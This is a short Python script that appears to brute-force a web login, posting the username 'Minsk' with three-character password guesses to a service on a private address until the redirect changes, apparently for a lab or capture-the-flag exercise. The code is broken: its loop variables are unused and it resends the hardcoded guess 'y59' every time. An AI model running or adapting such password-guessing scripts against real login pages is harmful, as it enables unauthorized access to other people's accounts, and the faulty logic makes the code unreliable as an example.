from pprint import pp
import sys
import requests
import string


s = string.ascii_letters
for i in range(0,10):
    s = f"{s}{i}"

data = {'username':'Minsk','password':''}

print(s)
exit = False
while exit == False:
    for c1 in s:
        for c2 in s:
            for c3 in s:
                pw = f"{'y'}{'5'}{'9'}"
                data['password'] = pw
                print(data)
                res = requests.post("http://192.168.0.128:5000/",data=data)
                print(res.url)
                print(res.status_code)
                if res.url!="http://192.168.0.128:5000/":
                    sys.exit()

    



    #r = requests.post("*",)
